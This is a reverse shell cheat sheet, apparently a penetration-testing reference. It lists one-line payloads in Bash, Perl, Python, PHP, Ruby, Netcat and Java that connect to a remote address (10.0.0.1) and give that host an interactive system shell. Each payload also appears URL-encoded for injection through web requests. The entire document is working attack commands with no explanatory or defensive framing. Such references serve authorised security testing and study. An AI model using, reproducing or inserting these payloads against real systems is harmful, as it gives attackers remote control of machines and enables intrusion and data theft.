## Reverse Shell Cheat Sheet

### Bash

```bash
## Standard
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

## URL Encoded
bash%20-i%20%3E%26%20%2fdev%2ftcp%2f10.0.0.1%2f8080%200%3E%261
```

### PERL

```perl
## Standard
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

## URL Encoded
perl%20-e%20%27use%20Socket%3B%24i%3D%2210.0.0.1%22%3B%24p%3D1234%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27
```

### Python

```python
## Standard
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

## URL Encoded
python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.0.0.1%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2fbin%2fsh%22%2C%22-i%22%5D%29%3B%27
```

### PHP

```php
## Standard
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

## URL Encoded
php%20-r%20%27%24sock%3Dfsockopen%28%2210.0.0.1%22%2C1234%29%3Bexec%28%22%2fbin%2fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

### Ruby

```ruby
## Standard
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

## URL Encoded
ruby%20-rsocket%20-e%27f%3DTCPSocket.open%28%2210.0.0.1%22%2C1234%29.to_i%3Bexec%20sprintf%28%22%2fbin%2fsh%20-i%20%3C%26%25d%20%3E%26%25d%202%3E%26%25d%22%2Cf%2Cf%2Cf%29%27
```

### Netcat

```bash
## Standard
nc -e /bin/sh 10.0.0.1 1234

## URL Encoded
nc%20-e%20%2fbin%2fsh%2010.0.0.1%201234
```

### Java

```java
## Standard
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

## URL Encoded
r%20%3D%20Runtime.getRuntime%28%29%0Ap%20%3D%20r.exec%28%5B%22%2fbin%2fbash%22%2C%22-c%22%2C%22exec%205%3C%3E%2fdev%2ftcp%2f10.0.0.1%2f2002%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%5C%24line%202%3E%265%20%3E%265%3B%20done%22%5D%20as%20String%5B%5D%29%0Ap.waitFor%28%29
```
